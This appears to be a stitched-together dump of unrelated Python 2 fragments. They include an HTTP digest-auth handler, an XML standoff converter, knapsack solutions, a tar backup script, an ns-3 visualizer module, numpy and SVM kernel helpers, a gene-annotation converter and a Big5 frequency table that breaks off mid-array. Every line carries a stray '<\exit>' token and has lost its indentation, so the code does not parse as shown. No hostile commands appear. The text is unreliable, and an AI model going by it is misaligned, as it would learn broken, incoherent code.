s = str(self.nonce_count).encode('utf-8')<\exit>
s += nonce.encode('utf-8')<\exit>
s += time.ctime().encode('utf-8')<\exit>
s += os.urandom(8)<\exit>
cnonce = (hashlib.sha1(s).hexdigest()[:16])<\exit>
noncebit = "%s:%s:%s:%s:%s" % (nonce, ncvalue, cnonce, qop, hash_utf8(A2))<\exit>
respdig = KD(hash_utf8(A1), noncebit)<\exit>
elif qop is None:<\exit>
respdig = KD(hash_utf8(A1), "%s:%s" % (nonce, hash_utf8(A2)))<\exit>
else:<\exit>
return None<\exit>
self.last_nonce = nonce<\exit>
base = 'username="%s", realm="%s", nonce="%s", uri="%s", ' \<\exit>
'response="%s"' % (self.username, realm, nonce, path, respdig)<\exit>
if opaque:<\exit>
base += ', opaque="%s"' % opaque<\exit>
if entdig:<\exit>
base += ', digest="%s"' % entdig<\exit>
base += ', algorithm="%s"' % algorithm<\exit>
if qop:<\exit>
base += ', qop=auth, nc=%s, cnonce="%s"' % (ncvalue, cnonce)<\exit>
return 'Digest %s' % (base)<\exit>
def handle_401(self, r):<\exit>
num_401_calls = r.request.hooks['response'].count(self.handle_401)<\exit>
s_auth = r.headers.get('www-authenticate', '')<\exit>
if 'digest' in s_auth.lower() and num_401_calls < 2:<\exit>
self.chal = parse_dict_header(s_auth.replace('Digest ', ''))<\exit>
r.content<\exit>
r.raw.release_conn()<\exit>
r.request.headers['Authorization'] = self.build_digest_header(r.request.method, r.request.url)<\exit>
_r = r.connection.send(r.request)<\exit>
_r.history.append(r)<\exit>
return _r<\exit>
return r<\exit>
def __call__(self, r):<\exit>
if self.last_nonce:<\exit>
r.headers['Authorization'] = self.build_digest_header(r.method, r.url)<\exit>
r.register_hook('response', self.handle_401)<\exit>
return r<\exit>
import sys<\exit>
import re<\exit>
try:<\exit>
import cElementTree as ET<\exit>
except:<\exit>
import xml.etree.cElementTree as ET<\exit>
EXCLUDED_TAGS = [<\exit>
"SURNAME",<\exit>
"AUTHOR",<\exit>
"REFERENCE",<\exit>
"AUTHORLIST",<\exit>
"JOURNAL",<\exit>
"YEAR",<\exit>
"P",<\exit>
"TITLE",<\exit>
"DIV",<\exit>
"HEADER",<\exit>
"FIGURE",<\exit>
"XREF",<\exit>
"CURRENT_SURNAME",<\exit>
"CURRENT_AUTHOR",<\exit>
"FOOTNOTE",<\exit>
"DATE",<\exit>
"TABLE",<\exit>
"CURRENT_NAME",<\exit>
"EQN",<\exit>
"EQ-S",<\exit>
"ISSUE",<\exit>
"REFERENCELIST",<\exit>
"PAPER",<\exit>
"METADATA",<\exit>
"FILENO",<\exit>
"FIGURELIST",<\exit>
"CURRENT_TITLE",<\exit>
"CURRENT_AUTHORLIST",<\exit>
"BODY",<\exit>
"ABSTRACT",<\exit>
"FOOTNOTELIST",<\exit>
"TABLELIST",<\exit>
"ACKNOWLEDGMENTS",<\exit>
"REF",<\exit>
]<\exit>
EXCLUDED_TAG = { t:True for t in EXCLUDED_TAGS }<\exit>
ELIDED_TEXT_STRING = "[[[...]]]"<\exit>
MAXIMUM_TEXT_DISPLAY_LENGTH = 1000<\exit>
def c_escape(s):<\exit>
return s.replace('\\', '\\\\').replace('\t','\\t').replace('\n','\\n')<\exit>
def strip_ns(tag):<\exit>
return tag if tag[0] != '{' else re.sub(r'\{.*?\}', '', tag)<\exit>
class Standoff:<\exit>
def __init__(self, sid, element, start, end, text):<\exit>
self.sid     = sid<\exit>
self.element = element<\exit>
self.start   = start<\exit>
self.end     = end<\exit>
self.text    = text<\exit>
def strip(self):<\exit>
while self.start < self.end and self.text[0].isspace():<\exit>
self.start += 1<\exit>
self.text = self.text[1:]<\exit>
while self.start < self.end and self.text[-1].isspace():<\exit>
self.end -= 1<\exit>
self.text = self.text[:-1]<\exit>
def compress_text(self, l):<\exit>
if len(self.text) >= l:<\exit>
el = len(ELIDED_TEXT_STRING)<\exit>
sl = (l-el)/2<\exit>
self.text = (self.text[:sl]+ELIDED_TEXT_STRING+self.text[-(l-sl-el):])<\exit>
def tag(self):<\exit>
return strip_ns(self.element.tag)<\exit>
def attrib(self):<\exit>
attrib = {}<\exit>
for a in self.element.attrib:<\exit>
if a[0] == "{":<\exit>
an = re.sub(r'\{.*?\}', '', a)<\exit>
else:<\exit>
an = a<\exit>
attrib[an] = self.element.attrib[a]<\exit>
return attrib<\exit>
def __str__(self):<\exit>
return "X%d\t%s %d %d\t%s\t%s" % \<\exit>
(self.sid, self.tag(), self.start, self.end,<\exit>
c_escape(self.text.encode("utf-8")),<\exit>
" ".join(['%s="%s"' % (k.encode("utf-8"), v.encode("utf-8"))<\exit>
for k,v in self.attrib().items()]))<\exit>
def txt(s):<\exit>
return s if s is not None else ""<\exit>
next_free_so_id = 1<\exit>
def text_and_standoffs(e, curroff=0, standoffs=None):<\exit>
global next_free_so_id<\exit>
if standoffs == None:<\exit>
standoffs = []<\exit>
startoff = curroff<\exit>
so = Standoff(next_free_so_id, e, 0, 0, "")<\exit>
next_free_so_id += 1<\exit>
standoffs.append(so)<\exit>
setext, dummy = subelem_text_and_standoffs(e, curroff+len(txt(e.text)), standoffs)<\exit>
text = txt(e.text) + setext<\exit>
curroff += len(text)<\exit>
so.start = startoff<\exit>
so.end   = curroff<\exit>
so.text  = text<\exit>
return (text, standoffs)<\exit>
def subelem_text_and_standoffs(e, curroff, standoffs):<\exit>
startoff = curroff<\exit>
text = ""<\exit>
for s in e:<\exit>
stext, dummy = text_and_standoffs(s, curroff, standoffs)<\exit>
text += stext<\exit>
text += txt(s.tail)<\exit>
curroff = startoff + len(text)<\exit>
return (text, standoffs)<\exit>
NORM_SPACE_REGEX = re.compile(r'\s+')<\exit>
def normalize_space(e, tags=None):<\exit>
if tags is None or strip_ns(e.tag) in tags:<\exit>
if e.text is not None:<\exit>
n = NORM_SPACE_REGEX.sub(' ', e.text)<\exit>
e.text = n<\exit>
if e.tail is not None:<\exit>
n = NORM_SPACE_REGEX.sub(' ', e.tail)<\exit>
e.tail = n<\exit>
if strip_ns(e.tag) in ('S', 'A-S'):<\exit>
e.tail = e.tail + '\n' if e.tail else '\n'<\exit>
for c in e:<\exit>
normalize_space(c)<\exit>
def generate_id(prefix):<\exit>
if prefix not in generate_id._next:<\exit>
generate_id._next[prefix] = 1<\exit>
id_ = prefix+str(generate_id._next[prefix])<\exit>
generate_id._next[prefix] += 1<\exit>
return id_<\exit>
generate_id._next = {}<\exit>
def convert_s(s):<\exit>
sostrings = []<\exit>
tid = generate_id('T')<\exit>
type_ = s.attrib()['AZ'] if 'AZ' in s.attrib() else 'UNDEF'<\exit>
sostrings.append('%s\t%s %d %d\t%s' % \<\exit>
(tid, type_, s.start, s.end, s.text.encode("utf-8")))<\exit>
return sostrings<\exit>
convert_function = {<\exit>
"S" : convert_s,<\exit>
"A-S" : convert_s,<\exit>
}<\exit>
def main(argv=[]):<\exit>
if len(argv) != 4:<\exit>
print >> sys.stderr, "Usage:", argv[0], "IN-XML OUT-TEXT OUT-SO"<\exit>
return -1<\exit>
in_fn, out_txt_fn, out_so_fn = argv[1:]<\exit>
if in_fn == "-":<\exit>
in_fn = "/dev/stdin"<\exit>
if out_txt_fn == "-":<\exit>
out_txt_fn = "/dev/stdout"<\exit>
if out_so_fn == "-":<\exit>
out_so_fn = "/dev/stdout"<\exit>
tree = ET.parse(in_fn)<\exit>
root = tree.getroot()<\exit>
normalize_space(root, ['S', 'A-S'])<\exit>
text, standoffs = text_and_standoffs(root)<\exit>
for s in standoffs:<\exit>
s.strip()<\exit>
standoffs = [s for s in standoffs if not s.tag() in EXCLUDED_TAG]<\exit>
converted = []<\exit>
for s in standoffs:<\exit>
if s.tag() in convert_function:<\exit>
converted.extend(convert_function[s.tag()](s))<\exit>
else:<\exit>
converted.append(s)<\exit>
standoffs = converted<\exit>
for so in standoffs:<\exit>
try:<\exit>
so.compress_text(MAXIMUM_TEXT_DISPLAY_LENGTH)<\exit>
except AttributeError:<\exit>
pass<\exit>
out_txt = open(out_txt_fn, "wt")<\exit>
out_so  = open(out_so_fn, "wt")<\exit>
out_txt.write(text.encode("utf-8"))<\exit>
for so in standoffs:<\exit>
print >> out_so, so<\exit>
out_txt.close()<\exit>
out_so.close()<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
return sum(cipher) / 2.0<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
N = int(f.readline().strip())<\exit>
cipher = []<\exit>
for _ in xrange(N):<\exit>
cipher.append(int(f.readline().strip()))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution:<\exit>
def backPackII(self, m, A, V):<\exit>
n = len(A)<\exit>
f = [0 for _ in xrange(m+1)]<\exit>
for i in xrange(1, n+1):<\exit>
copy = list(f)<\exit>
for j in xrange(1, m+1):<\exit>
if j-A[i-1]>=0:<\exit>
f[j] = max(copy[j], copy[j-A[i-1]]+V[i-1])<\exit>
else:<\exit>
f[j] = copy[j]<\exit>
return f[m]<\exit>
class Solution(object):<\exit>
def backPack(self, m, A):<\exit>
n = len(A)<\exit>
f = [0 for _ in xrange(m+1)]<\exit>
for i in xrange(1, n+1):<\exit>
copy = list(f)<\exit>
for j in xrange(1, m+1):<\exit>
if j-A[i-1] >= 0:<\exit>
f[j] = max(copy[j], copy[j-A[i-1]]+A[i-1])<\exit>
else:<\exit>
f[j] = copy[j]<\exit>
return f[m]<\exit>
class Solution_TLE(object):<\exit>
def backPack(self, m, A):<\exit>
result = [0]<\exit>
self.dfs(A, 0, m, result)<\exit>
return result[0]<\exit>
def dfs(self, seq, cur, m, result):<\exit>
if cur > m:<\exit>
return<\exit>
result[0] = max(result[0], cur)<\exit>
if seq:<\exit>
self.dfs(seq[1:], cur+seq[0], m, result)<\exit>
self.dfs(seq[1:], cur, m, result)<\exit>
class Solution_MLE(object):<\exit>
def backPack(self, m, A):<\exit>
n = len(A)<\exit>
f = [[0 for _ in xrange(m+1)] for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
for j in xrange(1, m+1):<\exit>
if j-A[i-1] >= 0:<\exit>
f[i][j] = max(f[i-1][j], f[i-1][j-A[i-1]]+A[i-1])<\exit>
else:<\exit>
f[i][j] = f[i-1][j]<\exit>
return f[n][m]<\exit>
if __name__ == "__main__":<\exit>
print Solution().backPack(11, [2, 3, 5, 7])<\exit>
from datetime import datetime<\exit>
from os import mkdir, remove<\exit>
from os.path import dirname, exists, basename<\exit>
from os.path import join as path_join<\exit>
from shlex import split as shlex_split<\exit>
from subprocess import Popen<\exit>
from sys import path as sys_path<\exit>
from sys import stderr as sys_stderr<\exit>
sys_path.append(path_join(dirname(__file__), '..'))<\exit>
from config import WORK_DIR, DATA_DIR<\exit>
TOOL_BACKUP_DIR = path_join(WORK_DIR, 'bckup_tool')<\exit>
def _safe_dirname(path):<\exit>
return basename(path) or dirname(dirname(path))<\exit>
def main(args):<\exit>
if not exists(TOOL_BACKUP_DIR):<\exit>
mkdir(TOOL_BACKUP_DIR)<\exit>
timestamp = datetime.utcnow().strftime('%Y-%m-%dT%H:%M%SZ')<\exit>
backup_path = path_join(TOOL_BACKUP_DIR, '%s-%s.tar.gz' % (<\exit>
_safe_dirname(DATA_DIR), timestamp))<\exit>
data_dir_parent = path_join(DATA_DIR, '..')<\exit>
tar_cmd = 'tar -c -z -f %s -C %s %s' % (backup_path, data_dir_parent,<\exit>
_safe_dirname(DATA_DIR))<\exit>
tar_p = Popen(shlex_split(tar_cmd))<\exit>
tar_p.wait()<\exit>
if tar_p.returncode != 0:<\exit>
remove(backup_path)<\exit>
return -1<\exit>
else:<\exit>
return 0<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
import ns.point_to_point<\exit>
import ns.csma<\exit>
import ns.wifi<\exit>
import ns.bridge<\exit>
import ns.internet<\exit>
import ns.mesh<\exit>
import ns.wimax<\exit>
import ns.wimax<\exit>
import gobject<\exit>
import os.path<\exit>
import sys<\exit>
PIXELS_PER_METER = 3.0<\exit>
class PyVizObject(gobject.GObject):<\exit>
__gtype_name__ = "PyVizObject"<\exit>
def tooltip_query(self, tooltip):<\exit>
tooltip.set_text("TODO: tooltip for %r" % self)<\exit>
class Link(PyVizObject):<\exit>
pass<\exit>
class InformationWindow(object):<\exit>
def update(self):<\exit>
raise NotImplementedError<\exit>
class NetDeviceTraits(object):<\exit>
def __init__(self, is_wireless=None, is_virtual=False):<\exit>
assert is_virtual or is_wireless is not None<\exit>
self.is_wireless = is_wireless<\exit>
self.is_virtual = is_virtual<\exit>
netdevice_traits = {<\exit>
ns.point_to_point.PointToPointNetDevice: NetDeviceTraits(is_wireless=False),<\exit>
ns.csma.CsmaNetDevice: NetDeviceTraits(is_wireless=False),<\exit>
ns.wifi.WifiNetDevice: NetDeviceTraits(is_wireless=True),<\exit>
ns.bridge.BridgeNetDevice: NetDeviceTraits(is_virtual=True),<\exit>
ns.internet.LoopbackNetDevice: NetDeviceTraits(is_virtual=True, is_wireless=False),<\exit>
ns.mesh.MeshPointDevice: NetDeviceTraits(is_virtual=True),<\exit>
ns.wimax.SubscriberStationNetDevice: NetDeviceTraits(is_wireless=True),<\exit>
ns.wimax.BaseStationNetDevice: NetDeviceTraits(is_wireless=True),<\exit>
}<\exit>
def lookup_netdevice_traits(class_type):<\exit>
try:<\exit>
return netdevice_traits[class_type]<\exit>
except KeyError:<\exit>
sys.stderr.write("WARNING: no NetDeviceTraits registered for device type %r; "<\exit>
"I will assume this is a non-virtual wireless device, "<\exit>
"but you should edit %r, variable 'netdevice_traits',"<\exit>
" to make sure.\n" % (class_type.__name__, __file__))<\exit>
t = NetDeviceTraits(is_virtual=False, is_wireless=True)<\exit>
netdevice_traits[class_type] = t<\exit>
return t<\exit>
def transform_distance_simulation_to_canvas(d):<\exit>
return d*PIXELS_PER_METER<\exit>
def transform_point_simulation_to_canvas(x, y):<\exit>
return x*PIXELS_PER_METER, y*PIXELS_PER_METER<\exit>
def transform_distance_canvas_to_simulation(d):<\exit>
return d/PIXELS_PER_METER<\exit>
def transform_point_canvas_to_simulation(x, y):<\exit>
return x/PIXELS_PER_METER, y/PIXELS_PER_METER<\exit>
plugins = []<\exit>
plugin_modules = {}<\exit>
def register_plugin(plugin_init_func, plugin_name=None, plugin_module=None):<\exit>
assert callable(plugin_init_func)<\exit>
plugins.append(plugin_init_func)<\exit>
if plugin_module is not None:<\exit>
plugin_modules[plugin_name] = plugin_module<\exit>
plugins_loaded = False<\exit>
def load_plugins():<\exit>
global plugins_loaded<\exit>
if plugins_loaded:<\exit>
return<\exit>
plugins_loaded = True<\exit>
plugins_dir = os.path.join(os.path.dirname(__file__), 'plugins')<\exit>
old_path = list(sys.path)<\exit>
sys.path.insert(0, plugins_dir)<\exit>
for filename in os.listdir(plugins_dir):<\exit>
name, ext = os.path.splitext(filename)<\exit>
if ext != '.py':<\exit>
continue<\exit>
try:<\exit>
plugin_module = __import__(name)<\exit>
except ImportError, ex:<\exit>
print >> sys.stderr, "Could not load plugin %r: %s" % (filename, str(ex))<\exit>
continue<\exit>
try:<\exit>
plugin_func = plugin_module.register<\exit>
except AttributeError:<\exit>
print >> sys.stderr, "Plugin %r has no 'register' function" % name<\exit>
else:<\exit>
register_plugin(plugin_func, name, plugin_module)<\exit>
sys.path = old_path<\exit>
import numpy as np<\exit>
import numpy.linalg as la<\exit>
def prime_sieve(n):<\exit>
is_prime = np.ones((n, ), dtype=bool)<\exit>
is_prime[:2] = 0<\exit>
N_max = int(np.sqrt(len(is_prime)))<\exit>
for j in xrange(2, N_max+1):<\exit>
is_prime[2*j::j] = False<\exit>
return is_prime<\exit>
def sort(x):<\exit>
return np.argsort(x)<\exit>
def help(s):<\exit>
np.lookfor(str)<\exit>
def arange(b, e, s):<\exit>
return np.arange(b, e, s)<\exit>
if __name__=="__main__":<\exit>
print np.arange(1000)<\exit>
print prime_sieve(100)<\exit>
class Kernel(object):<\exit>
def apply(self, **kwargs):<\exit>
raise NotImplementedError("Not implemented")<\exit>
class QuadraticKernel(Kernel):<\exit>
def apply(self, X, Y, x):<\exit>
ret = np.dot(X.T, x)<\exit>
ret += 1<\exit>
ret = np.power(ret, 2)<\exit>
d, T = x.shape<\exit>
ret = np.multiply(ret, np.repeat(Y[:, np.newaxis], repeats=T, axis=1))<\exit>
ret = np.sum(ret, axis=0)<\exit>
return ret<\exit>
class RbfKernel(Kernel):<\exit>
def __init__(self, sigma):<\exit>
self.sigma = sigma<\exit>
super(RbfKernel, self).__init__()<\exit>
def apply(self, X, Y, x):<\exit>
d, T = x.shape<\exit>
_, N = X.shape<\exit>
ret = np.zeros((N, T))<\exit>
for i in xrange(T):<\exit>
point = x[:, i]<\exit>
cur = X - np.repeat(point[:, np.newaxis], repeats=N, axis=1)<\exit>
cur = np.linalg.norm(cur, axis=0)<\exit>
cur = -np.power(cur, 2)<\exit>
cur = np.exp(cur/(2*self.sigma**2))<\exit>
cur = np.multiply(cur, Y)<\exit>
ret[:, i] = cur<\exit>
ret = np.sum(ret, axis=0)<\exit>
return ret<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
def char_offsets(text, start, end, ttext):<\exit>
idx, nospcidx = 0,0<\exit>
while True:<\exit>
while idx < len(text) and text[idx].isspace():<\exit>
idx += 1<\exit>
assert idx < len(text), "Error in data"<\exit>
if nospcidx == start:<\exit>
break<\exit>
nospcidx += 1<\exit>
idx += 1<\exit>
char_start = idx<\exit>
while nospcidx < end:<\exit>
nospcidx += 1<\exit>
idx += 1<\exit>
while idx < len(text) and text[idx].isspace():<\exit>
idx += 1<\exit>
char_end = idx+1<\exit>
if (text[char_start:char_end] == '/translation upstream factor' and<\exit>
ttext                     == 'translation upstream factor'):<\exit>
print >> sys.stderr, "NOTE: applying special-case fix ..."<\exit>
char_start += 1<\exit>
ref_text = text[char_start:char_end]<\exit>
assert ref_text == ttext, "Mismatch: '%s' vs '%s' [%d:%d] (%s %d-%d)" % (ttext, ref_text, char_start, char_end, text, start, end)<\exit>
return char_start, char_end<\exit>
def main(argv):<\exit>
if len(argv) != 4:<\exit>
print >> sys.stderr, "Usage:", argv[0], "BC2TEXT BC2TAGS OUTPUT-DIR"<\exit>
return 1<\exit>
textfn, tagfn, outdir = argv[1:]<\exit>
tags = {}<\exit>
with open(tagfn, 'rU') as tagf:<\exit>
for l in tagf:<\exit>
l = l.rstrip('\n')<\exit>
m = re.match(r'^([^\|]+)\|(\d+) (\d+)\|(.*)$', l)<\exit>
assert m, "Format error in %s: %s" % (tagfn, l)<\exit>
sid, start, end, text = m.groups()<\exit>
start, end = int(start), int(end)<\exit>
if sid not in tags:<\exit>
tags[sid] = []<\exit>
tags[sid].append((start, end, text))<\exit>
texts = {}<\exit>
with open(textfn, 'rU') as textf:<\exit>
for l in textf:<\exit>
l = l.rstrip('\n')<\exit>
m = re.match(r'(\S+) (.*)$', l)<\exit>
assert m, "Format error in %s: %s" % (textfn, l)<\exit>
sid, text = m.groups()<\exit>
assert sid not in texts, "Error: duplicate ID %s" % sid<\exit>
texts[sid] = text<\exit>
offsets = {}<\exit>
for sid in texts:<\exit>
offsets[sid] = []<\exit>
for start, end, ttext in tags.get(sid,[]):<\exit>
soff, eoff = char_offsets(texts[sid], start, end, ttext)<\exit>
offsets[sid].append((soff, eoff))<\exit>
for sid in texts:<\exit>
with open(os.path.join(outdir, sid+".txt"), 'w') as txtf:<\exit>
print >> txtf, texts[sid]<\exit>
with open(os.path.join(outdir, sid+".ann"), 'w') as annf:<\exit>
tidx = 1<\exit>
for soff, eoff in offsets[sid]:<\exit>
print >> annf, "T%d\tGENE %d %d\t%s" % (tidx, soff, eoff, texts[sid][soff:eoff])<\exit>
tidx += 1<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
BIG5_TYPICAL_DISTRIBUTION_RATIO = 0.75<\exit>
BIG5_TABLE_SIZE = 5376<\exit>
Big5CharToFreqOrder = (<\exit>
1,1801,1506, 255,1431, 198,   9,  82,   6,5008, 177, 202,3681,1256,2821, 110,<\exit>
3814,  33,3274, 261,  76,  44,2114,  16,2946,2187,1176, 659,3971,  26,3451,2653,<\exit>
1198,3972,3350,4202, 410,2215, 302, 590, 361,1964,   8, 204,  58,4510,5009,1932,<\exit>
63,5010,5011, 317,1614,  75, 222, 159,4203,2417,1480,5012,3555,3091, 224,2822,<\exit>
3682,   3,  10,3973,1471,  29,2787,1135,2866,1940, 873, 130,3275,1123, 312,5013,<\exit>
4511,2052, 507, 252, 682,5014, 142,1915, 124, 206,2947,  34,3556,3204,  64, 604,<\exit>
5015,2501,1977,1978, 155,1991, 645, 641,1606,5016,3452, 337,  72, 406,5017,  80,<\exit>
630, 238,3205,1509, 263, 939,1092,2654, 756,1440,1094,3453, 449,  69,2987, 591,<\exit>
179,2096, 471, 115,2035,1844,  60,  50,2988, 134, 806,1869, 734,2036,3454, 180,<\exit>
995,1607, 156, 537,2907, 688,5018, 319,1305, 779,2145, 514,2379, 298,4512, 359,<\exit>
2502,  90,2716,1338, 663,  11, 906,1099,2553,  20,2441, 182, 532,1716,5019, 732,<\exit>
1376,4204,1311,1420,3206,  25,2317,1056, 113, 399, 382,1950, 242,3455,2474, 529,<\exit>
3276, 475,1447,3683,5020, 117,  21, 656, 810,1297,2300,2334,3557,5021, 126,4205,<\exit>
706, 456, 150, 613,4513,  71,1118,2037,4206, 145,3092,  85, 835, 486,2115,1246,<\exit>
1426, 428, 727,1285,1015, 800, 106, 623, 303,1281,5022,2128,2359, 347,3815, 221,<\exit>
3558,3135,5023,1956,1153,4207,  83, 296,1199,3093, 192, 624,  93,5024, 822,1898,<\exit>
2823,3136, 795,2065, 991,1554,1542,1592,  27,  43,2867, 859, 139,1456, 860,4514,<\exit>
437, 712,3974, 164,2397,3137, 695, 211,3037,2097, 195,3975,1608,3559,3560,3684,<\exit>
3976, 234, 811,2989,2098,3977,2233,1441,3561,1615,2380, 668,2077,1638, 305, 228,<\exit>
1664,4515, 467, 415,5025, 262,2099,1593, 239, 108, 300, 200,1033, 512,1247,2078,<\exit>
5026,5027,2176,3207,3685,2682, 593, 845,1062,3277,  88,1723,2038,3978,1951, 212,<\exit>
266, 152, 149, 468,1899,4208,4516,  77, 187,5028,3038,  37,   5,2990,5029,3979,<\exit>
5030,5031,  39,2524,4517,2908,3208,2079,  55, 148,  74,4518, 545, 483,1474,1029,<\exit>
1665, 217,1870,1531,3138,1104,2655,4209,  24, 172,3562, 900,3980,3563,3564,4519,<\exit>
32,1408,2824,1312, 329, 487,2360,2251,2717, 784,2683,   4,3039,3351,1427,1789,<\exit>
188, 109, 499,5032,3686,1717,1790, 888,1217,3040,4520,5033,3565,5034,3352,1520,<\exit>
3687,3981, 196,1034, 775,5035,5036, 929,1816, 249, 439,  38,5037,1063,5038, 794,<\exit>
3982,1435,2301,  46, 178,3278,2066,5039,2381,5040, 214,1709,4521, 804,  35, 707,<\exit>
324,3688,1601,2554, 140, 459,4210,5041,5042,1365, 839, 272, 978,2262,2580,3456,<\exit>
2129,1363,3689,1423, 697, 100,3094,  48,  70,1231, 495,3139,2196,5043,1294,5044,<\exit>
2080, 462, 586,1042,3279, 853, 256, 988, 185,2382,3457,1698, 434,1084,5045,3458,<\exit>
314,2625,2788,4522,2335,2336, 569,2285, 637,1817,2525, 757,1162,1879,1616,3459,<\exit>
287,1577,2116, 768,4523,1671,2868,3566,2526,1321,3816, 909,2418,5046,4211, 933,<\exit>
3817,4212,2053,2361,1222,4524, 765,2419,1322, 786,4525,5047,1920,1462,1677,2909,<\exit>
1699,5048,4526,1424,2442,3140,3690,2600,3353,1775,1941,3460,3983,4213, 309,1369,<\exit>
1130,2825, 364,2234,1653,1299,3984,3567,3985,3986,2656, 525,1085,3041, 902,2001,<\exit>
1475, 964,4527, 421,1845,1415,1057,2286, 940,1364,3141, 376,4528,4529,1381,   7,<\exit>
2527, 983,2383, 336,1710,2684,1846, 321,3461, 559,1131,3042,2752,1809,1132,1313,<\exit>
265,1481,1858,5049, 352,1203,2826,3280, 167,1089, 420,2827, 776, 792,1724,3568,<\exit>
4214,2443,3281,5050,4215,5051, 446, 229, 333,2753, 901,3818,1200,1557,4530,2657,<\exit>
1921, 395,2754,2685,3819,4216,1836, 125, 916,3209,2626,4531,5052,5053,3820,5054,<\exit>
5055,5056,4532,3142,3691,1133,2555,1757,3462,1510,2318,1409,3569,5057,2146, 438,<\exit>
2601,2910,2384,3354,1068, 958,3043, 461, 311,2869,2686,4217,1916,3210,4218,1979,<\exit>
383, 750,2755,2627,4219, 274, 539, 385,1278,1442,5058,1154,1965, 384, 561, 210,<\exit>
98,1295,2556,3570,5059,1711,2420,1482,3463,3987,2911,1257, 129,5060,3821, 642,<\exit>
523,2789,2790,2658,5061, 141,2235,1333,  68, 176, 441, 876, 907,4220, 603,2602,<\exit>
710, 171,3464, 404, 549,  18,3143,2398,1410,3692,1666,5062,3571,4533,2912,4534,<\exit>
5063,2991, 368,5064, 146, 366,  99, 871,3693,1543, 748, 807,1586,1185,  22,2263,<\exit>
379,3822,3211,5065,3212, 505,1942,2628,1992,1382,2319,5066, 380,2362, 218, 702,<\exit>
1818,1248,3465,3044,3572,3355,3282,5067,2992,3694, 930,3283,3823,5068,  59,5069,<\exit>
585, 601,4221, 497,3466,1112,1314,4535,1802,5070,1223,1472,2177,5071, 749,1837,<\exit>
690,1900,3824,1773,3988,1476, 429,1043,1791,2236,2117, 917,4222, 447,1086,1629,<\exit>
5072, 556,5073,5074,2021,1654, 844,1090, 105, 550, 966,1758,2828,1008,1783, 686,<\exit>
1095,5075,2287, 793,1602,5076,3573,2603,4536,4223,2948,2302,4537,3825, 980,2503,<\exit>
544, 353, 527,4538, 908,2687,2913,5077, 381,2629,1943,1348,5078,1341,1252, 560,<\exit>
3095,5079,3467,2870,5080,2054, 973, 886,2081, 143,4539,5081,5082, 157,3989, 496,<\exit>
4224,  57, 840, 540,2039,4540,4541,3468,2118,1445, 970,2264,1748,1966,2082,4225,<\exit>
3144,1234,1776,3284,2829,3695, 773,1206,2130,1066,2040,1326,3990,1738,1725,4226,<\exit>
279,3145,  51,1544,2604, 423,1578,2131,2067, 173,4542,1880,5083,5084,1583, 264,<\exit>
610,3696,4543,2444, 280, 154,5085,5086,5087,1739, 338,1282,3096, 693,2871,1411,<\exit>
1074,3826,2445,5088,4544,5089,5090,1240, 952,2399,5091,2914,1538,2688, 685,1483,<\exit>
4227,2475,1436, 953,4228,2055,4545, 671,2400,  79,4229,2446,3285, 608, 567,2689,<\exit>
3469,4230,4231,1691, 393,1261,1792,2401,5092,4546,5093,5094,5095,5096,1383,1672,<\exit>
3827,3213,1464, 522,1119, 661,1150, 216, 675,4547,3991,1432,3574, 609,4548,2690,<\exit>
2402,5097,5098,5099,4232,3045,   0,5100,2476, 315, 231,2447, 301,3356,4549,2385,<\exit>
5101, 233,4233,3697,1819,4550,4551,5102,  96,1777,1315,2083,5103, 257,5104,1810,<\exit>
3698,2718,1139,1820,4234,2022,1124,2164,2791,1778,2659,5105,3097, 363,1655,3214,<\exit>
5106,2993,5107,5108,5109,3992,1567,3993, 718, 103,3215, 849,1443, 341,3357,2949,<\exit>
1484,5110,1712, 127,  67, 339,4235,2403, 679,1412, 821,5111,5112, 834, 738, 351,<\exit>
2994,2147, 846, 235,1497,1881, 418,1993,3828,2719, 186,1100,2148,2756,3575,1545,<\exit>
1355,2950,2872,1377, 583,3994,4236,2581,2995,5113,1298,3699,1078,2557,3700,2363,<\exit>
78,3829,3830, 267,1289,2100,2002,1594,4237, 348, 369,1274,2197,2178,1838,4552,<\exit>
1821,2830,3701,2757,2288,2003,4553,2951,2758, 144,3358, 882,4554,3995,2759,3470,<\exit>
4555,2915,5114,4238,1726, 320,5115,3996,3046, 788,2996,5116,2831,1774,1327,2873,<\exit>
3997,2832,5117,1306,4556,2004,1700,3831,3576,2364,2660, 787,2023, 506, 824,3702,<\exit>
534, 323,4557,1044,3359,2024,1901, 946,3471,5118,1779,1500,1678,5119,1882,4558,<\exit>
165, 243,4559,3703,2528, 123, 683,4239, 764,4560,  36,3998,1793, 589,2916, 816,<\exit>
626,1667,3047,2237,1639,1555,1622,3832,3999,5120,4000,2874,1370,1228,1933, 891,<\exit>
2084,2917, 304,4240,5121, 292,2997,2720,3577, 691,2101,4241,1115,4561, 118, 662,<\exit>
5122, 611,1156, 854,2386,1316,2875,   2, 386, 515,2918,5123,5124,3286, 868,2238,<\exit>
1486, 855,2661, 785,2216,3048,5125,1040,3216,3578,5126,3146, 448,5127,1525,5128,<\exit>
2165,4562,5129,3833,5130,4242,2833,3579,3147, 503, 818,4001,3148,1568, 814, 676,<\exit>
1444, 306,1749,5131,3834,1416,1030, 197,1428, 805,2834,1501,4563,5132,5133,5134,<\exit>
1994,5135,4564,5136,5137,2198,  13,2792,3704,2998,3149,1229,1917,5138,3835,2132,<\exit>
5139,4243,4565,2404,3580,5140,2217,1511,1727,1120,5141,5142, 646,3836,2448, 307,<\exit>
5143,5144,1595,3217,5145,5146,5147,3705,1113,1356,4002,1465,2529,2530,5148, 519,<\exit>
5149, 128,2133,  92,2289,1980,5150,4003,1512, 342,3150,2199,5151,2793,2218,1981,<\exit>
3360,4244, 290,1656,1317, 789, 827,2365,5152,3837,4566, 562, 581,4004,5153, 401,<\exit>
4567,2252,  94,4568,5154,1399,2794,5155,1463,2025,4569,3218,1944,5156, 828,1105,<\exit>
4245,1262,1394,5157,4246, 605,4570,5158,1784,2876,5159,2835, 819,2102, 578,2200,<\exit>
